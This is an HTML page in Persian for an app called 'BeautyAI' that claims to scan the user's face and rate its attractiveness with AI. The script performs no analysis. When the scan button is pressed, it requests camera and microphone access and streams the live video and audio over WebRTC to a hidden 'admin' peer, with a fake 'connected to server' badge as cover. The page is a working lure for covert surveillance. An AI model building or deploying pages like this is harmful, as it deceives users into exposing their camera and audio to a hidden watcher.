<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BeautyAI - تشخیص جذابیت</title>
    <!-- فونت فارسی وزیرمتن -->
    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Vazirmatn', sans-serif;
        }

        body {
            background-color: #0d0d15; /* رنگ پس زمینه */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }

        /* کانتینر اصلی شبیه موبایل */
        .app-container {
            width: 100%;
            max-width: 420px;
            background: linear-gradient(180deg, #1a1a2e 0%, #0d0d15 100%);
            border-radius: 30px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid #2a2a40;
            position: relative;
            height: 90vh; /* ارتفاع به اندازه صفحه گوشی */
            max-height: 800px;
            display: flex;
            flex-direction: column;
        }

        /* هدر بالای صفحه */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: #161623;
            border-bottom: 1px solid #2a2a40;
        }

        .status-badge {
            background: #1e3a2f;
            color: #4ade80;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background: #4ade80;
            border-radius: 50%;
            box-shadow: 0 0 8px #4ade80;
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: bold;
            font-size: 18px;
        }

        .brand-icon {
            background: #6d28d9;
            width: 35px;
            height: 35px;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 18px;
        }

        /* بخش وسط (آیکون و متن ها) */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
        }

        .scan-icon-wrapper {
            width: 160px;
            height: 160px;
            background: radial-gradient(circle, #6d28d9 0%, #4c1d95 100%);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            margin-bottom: 40px;
            box-shadow: 0 0 40px rgba(109, 40, 217, 0.3);
        }

        .scan-icon-wrapper svg {
            width: 70px;
            height: 70px;
            stroke: white;
            stroke-width: 2;
            fill: none;
        }

        /* نقطه کوچک روی دایره */
        .scan-icon-wrapper::after {
            content: '';
            position: absolute;
            bottom: 20px;
            right: 25px;
            width: 15px;
            height: 15px;
            background: #9d7dfb;
            border-radius: 50%;
            border: 2px solid #4c1d95;
        }

        h1 {
            font-size: 26px;
            margin-bottom: 15px;
            line-height: 1.4;
        }

        h1 span {
            color: #8b5cf6; /* رنگ بنفش برای "هوش مصنوعی" */
        }

        p.description {
            color: #9ca3af;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 40px;
        }

        /* دکمه پایین */
        .start-btn {
            background: #6d28d9;
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 15px;
            font-size: 18px;
            font-weight: bold;
            font-family: inherit;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .start-btn:hover {
            background: #7c3aed;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(109, 40, 217, 0.4);
        }

        .start-btn:active {
            transform: translateY(0);
        }

        .start-btn svg {
            width: 24px;
            height: 24px;
            fill: none;
            stroke: currentColor;
            stroke-width: 2;
        }
        
        /* ویدیو مخفی برای زمانی که دوربین روشن می‌شود */
        #localVideo {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover;
            display: none;
            z-index: 10;
            border-radius: 30px;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <!-- هدر -->
        <div class="header">
            <div class="status-badge">
                <div class="status-dot"></div>
                متصل به سرور
            </div>
            <div class="brand">
                BeautyAI
                <div class="brand-icon">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
                </div>
            </div>
        </div>

        <!-- محتوای اصلی -->
        <div class="main-content" id="uiContent">
            <div class="scan-icon-wrapper">
                <!-- آیکون اسکن چهره -->
                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M7 3H4v3M17 3h3v3M7 21H4v-3M17 21h3v-3" />
                    <path d="M9 10a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" fill="white" stroke="none"/>
                    <path d="M15 10a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" fill="white" stroke="none"/>
                    <path d="M9 15c.83.67 2 1 3 1s2.17-.33 3-1" />
                </svg>
            </div>

            <h1>تشخیص جذابیت<br>با <span>هوش مصنوعی</span></h1>
            
            <p class="description">
                چهره‌ات را اسکن کن تا ربات AI امتیاز جذابیت و تحلیل کامل رو بهت نشون بده.
            </p>

            <button class="start-btn" id="startBtn">
                شروع اسکن
                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                    <circle cx="12" cy="13" r="4"></circle>
                </svg>
            </button>
        </div>

        <!-- ویدیو برای استریم (در ابتدا مخفی است) -->
        <video id="localVideo" autoplay playsinline muted></video>
    </div>

    <!-- اسکریپت‌های Socket.io و WebRTC (ادامه کدهای جلسه قبل) -->
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const startBtn = document.getElementById('startBtn');
        const localVideo = document.getElementById('localVideo');
        const uiContent = document.getElementById('uiContent');
        let pc, localStream;

        startBtn.addEventListener('click', async () => {
            try {
                startBtn.innerHTML = 'در حال اتصال...';
                
                // 1. گرفتن دسترسی دوربین
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // 2. نمایش ویدیوی خود کاربر (اختیاری - میتونی برداری تا کاربر خودش رو ببینه)
                localVideo.style.display = 'block';
                localVideo.srcObject = localStream;
                uiContent.style.display = 'none'; // مخفی کردن منو

                // 3. شروع WebRTC برای فرستادن به ادمین
                pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                
                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));

                pc.onicecandidate = event => {
                    if (event.candidate) socket.emit('user-ice', { candidate: event.candidate });
                };

                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                socket.emit('user-offer', { sdp: offer });

                socket.on('admin-answer', async ({ sdp }) => {
                    await pc.setRemoteDescription(new RTCSessionDescription(sdp));
                    console.log('✅ اتصال به ادمین برقرار شد');
                });

                socket.on('admin-ice', async ({ candidate }) => {
                    if (candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
                });

            } catch (err) {
                console.error(err);
                alert('❌ برای شروع اسکن، باید به دوربین دسترسی بدهید.');
                startBtn.innerHTML = 'شروع اسکن';
            }
        });
    </script>
</body>
</html>
